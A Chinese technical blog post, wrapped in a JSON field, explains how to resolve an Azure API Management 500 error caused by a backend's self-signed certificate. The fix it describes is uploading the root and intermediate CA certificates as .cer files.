      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lulight/p/19495544\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 11:54\">\n    <span>【Azure APIM】如何解决后端API服务配置自签名证书时APIM请求报错500：Error occured while calling backend service</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h1>问题描述</h1>\n<p>在博文“<a href=\"https://www.cnblogs.com/lulight/p/19479238\" target=\"_blank\">【Azure 环境】在Windows环境中使用OpenSSL生成自签名证书链步骤分享</a>”，我们通过OpenSSL已经创建了自签名证书PFX文件。&nbsp;</p>\n<p>当把证书配置到后端API服务，并且通过APIM作为服务对外提供的网关入口后，发现客户端请求发送到APIM，但是APIM访问后端服务器时候，无法建立Https连接。报错500。</p>\n<h2>访问流图</h2>\n<p><img alt=\"image\" class=\"lazyload\" height=\"224\" width=\"999\" /></p>\n<h2>错误信息</h2>\n<blockquote>\n<pre><span style=\"font-size: 16px;\"><span style=\"color: rgba(255, 102, 0, 1);\"><code class=\"code-line\" dir=\"auto\"><span style=\"color: rgba(0, 0, 0, 1);\">forward-request (356.754 ms)\n{\n    \"messages\": [</span></code></span><strong><span style=\"color: rgba(255, 102, 0, 1);\"><code class=\"code-line\" dir=\"auto\">\n        \"Error occured while calling backend service.\",\n        \"The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\",\n        \"The remote certificate is invalid according to the validation procedure.\"\n</code></span></strong><span style=\"color: rgba(255, 102, 0, 1);\"><code class=\"code-line\" dir=\"auto\"><span style=\"color: rgba(0, 0, 0, 1);\">    ]\n}</span></code></span></span></pre>\n</blockquote>\n<h2>在开启APIM调试Trace后，可见错误信息</h2>\n<p><img alt=\"image\" class=\"lazyload\" height=\"407\" width=\"666\" /></p>\n<p>面对这个问题，需要如何解决呢？</p>\n<p>&nbsp;</p>\n<h1>问题解答</h1>\n<p>因为浏览器发起HTTPS请求后，服务器会返回它的证书信息到客户端进行验证。但由于使用的自签名证书的根CA，中间证书都不是受信任机构所颁发的证书，所以在操作系统中没有内置CA信息，所以被浏览器认为这是不受信任的证书。就直接中断连接，返回net::ERR_CERT_AUTHORITY_INVALID 错误。</p>\n<h2>HTTPS证书验证流程图：</h2>\n<p><img alt=\"image\" class=\"lazyload\" height=\"599\" width=\"666\" /></p>\n<h1>当CA证书不受信任的时候，浏览器报错如下</h1>\n<p>Your connection is not private</p>\n<p>Attackers might be trying to steal your information from lbca.mylubu.com (for example, passwords, messages, or credit cards).</p>\n<p>Learn more about this warning net::ERR_CERT_AUTHORITY_INVALID</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 0, 1);\">Subject: </span>*<span style=\"color: rgba(0, 0, 0, 1);\">.mylubu.com\n\nIssuer: My Self Intermediate CA\n\nExpires on: Feb </span><span style=\"color: rgba(128, 0, 128, 1);\">29</span>, <span style=\"color: rgba(128, 0, 128, 1);\">2028</span><span style=\"color: rgba(0, 0, 0, 1);\">\n\nCurrent date: Jan </span><span style=\"color: rgba(128, 0, 128, 1);\">17</span>, <span style=\"color: rgba(128, 0, 128, 1);\">2026</span><span style=\"color: rgba(0, 0, 0, 1);\">\n\nPEM encoded chain:\n</span>-----BEGIN CERTIFICATE-----<span style=\"color: rgba(0, 0, 0, 1);\">\nMIIE3zCCAsegAwIBAgIUVoVVHuMRMxqelxTsX4OPtc3EnuUwDQYJKoZIhvcNAQEL\nBQAwYTELMAkGA1UEBhMCQ04xEDAO<br />......</span><span style=\"color: rgba(0, 0, 0, 1);\">\nSxmYHLkIM</span>/VbtjWKixl7mKltQMwbUvRMW+vOkZu/ibEtyG+<span style=\"color: rgba(0, 0, 0, 1);\">OfGBIA9InKqE0BSng\nHNIRYgeO7r1AfMtLHUCy</span>+RmC6AueslBWqdSminThQD8HbY+YvGFU9/zduVRY/<span style=\"color: rgba(0, 0, 0, 1);\">Uic\n3wFr\n</span>-----END CERTIFICATE-----</pre>\n</div>\n<p><img alt=\"image\" class=\"lazyload\" height=\"366\" width=\"666\" /></p>\n<p>如果对于本地客户端，解决方案就是把完整证书链的服务器证书PFX安装到本地就可以。当本地证书库中包含了这个服务器证书的中间证书，根证书后，浏览器访问就会被信任。</p>\n<h2>但是在APIM服务上，应该如何处理呢？</h2>\n<p>根据官方文档 “<a href=\"https://docs.azure.cn/zh-cn/api-management/api-management-howto-ca-certificates\" rel=\"noopener nofollow\" target=\"_blank\">如何在 Azure API 管理中添加自定义 CA 证书</a>”的介绍，APIM服务支持上传CA证书。</p>\n<p>&nbsp;</p>\n<p>在AIPM的证书管理页面，因为我们的服务器证书是一张包含根证书，中间证书，服务器证书的完整证书链证书，所以心想，是否可以直接上转这一张证书就可以了呢？</p>\n<p><span style=\"font-size: 15px;\"><strong>实验证明，不可以！</strong></span></p>\n<p><span style=\"font-size: 15px;\"><strong>错误实验第一步：上传服务器证书到CA Certificates</strong></span></p>\n<p><img alt=\"image\" class=\"lazyload\" height=\"88\" width=\"666\" /></p>\n<p><span style=\"font-size: 15px;\"><strong>错误实验第二步：访问APIM接口，错误依旧</strong></span></p>\n<p><img alt=\"image\" class=\"lazyload\" height=\"244\" width=\"666\" /></p>\n<p><span style=\"font-size: 15px;\"><strong>正确实验，按照要求，先后上传了根CA，中间CA证书。再次访问APIM接口，获取200返回，问题解决，自签名证书验证成功。</strong></span></p>\n<p><img alt=\"image\" class=\"lazyload\" height=\"471\" width=\"666\" /></p>\n<p><strong>注意：</strong>在上传证书页面，只支持cer和pfx格式证书(<code class=\"code-line code-active-line\" dir=\"auto\">File extension for rootCA.crt is not present in the allowed file extensions list - \"cer,pfx\")。</code>所以openSSL生成的.crt 证书可以通过Windows中双击打开文件后，选择导出为CER证书。</p>\n<p>1: 双击 rootCA.crt&nbsp;</p>\n<p>2: 选择 Details 项</p>\n<p>3: 点击Copy to File 按钮，在弹出的窗口中直接点击Next</p>\n<p>4: 默认选择第一个 DER encoded binary X.509 (.CER)</p>\n<p>5: 点击 Next， 在新一个窗口中选择 CER文件的保存路径。</p>\n<p><img alt=\"image\" class=\"lazyload\" height=\"366\" width=\"999\" /></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1>参考资料</h1>\n<p>在Windows环境中使用OpenSSL生成自签名证书链步骤分享 : <a href=\"https://www.cnblogs.com/lulight/p/19479238\" target=\"_blank\">https://www.cnblogs.com/lulight/p/19479238</a></p>\n<p>如何在 Azure API 管理中添加自定义 CA 证书 :&nbsp;<a href=\"https://docs.azure.cn/zh-cn/api-management/api-management-howto-ca-certificates\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.azure.cn/zh-cn/api-management/api-management-howto-ca-certificates</a></p>\n<p>&nbsp;</p>\n</div>\n<div id=\"MySignature\">\n    <div style=\"background: #1c5f55; height: 36px; width: 618px; padding: 14px 5px 0px 3px;\">\n  <p style=\"font-weight: bold; color: white;\">当在复杂的环境中面临问题，格物之道需：浊而静之徐清，安以动之徐生。 云中，恰是如此!</p>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-17 11:54</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lulight\">编码者卢布</a>&nbsp;\n阅读(<span id=\"post_view_count\">2</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}